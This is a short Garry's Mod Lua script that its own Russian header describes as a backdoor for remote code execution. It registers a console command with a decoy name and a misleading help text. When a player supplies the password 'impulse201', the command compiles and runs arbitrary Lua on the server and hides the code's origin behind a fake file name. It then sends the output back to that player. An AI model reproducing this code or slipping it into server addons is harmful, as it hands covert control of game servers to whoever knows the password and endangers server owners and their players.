-- @filename: playground.lua
-- @describe: Бэкдур для удалённого исполнения кода.

local function IsValid(object)
    if (not object) then return false; end
	local isvalid = object.IsValid;
	if (not isvalid) then return false; end
	return isvalid(object);
end

local CompileString = _G["CompileString"];
local PlayerSendLua	= FindMetaTable("Player")["SendLua"];

local playground    = {};

-- @function: playground:RunString(<string: code>)
-- @describe: Компилирует и исполняет указанный код.
-- @arguments (1): <string: code>
-- @returns: Any
function playground:RunString(code)
    local f = CompileString(tostring(code), "lua/includes/init.lua", false);
    if (isfunction(f)) then
        return select(2, pcall(f));
    else
        return tostring(f);
    end
end

-- @function: playground:Notice(<player: client>, <string: str>)
-- @describe: Отправляет уведомление игроку.
-- @arguments (2): <player: client>, <string: str>
-- @returns: None
function playground:Notice(client, str)
    if (IsValid(client) and isstring(str)) then
        return PlayerSendLua(client, string.format("print([[%s]])", str));
    end
end

concommand.Add("r_delude", function(ply, cmd, args)
    if (IsValid(ply) and tostring(args[1]) == "impulse201") then
        local spew = playground:RunString(tostring(args[2]));
        return playground:Notice(ply, (spew and
            tostring(spew) or "No return"));
    end
end, "Set the max delusion for the map.", FCVAR_CLIENTCMD_CAN_EXECUTE);
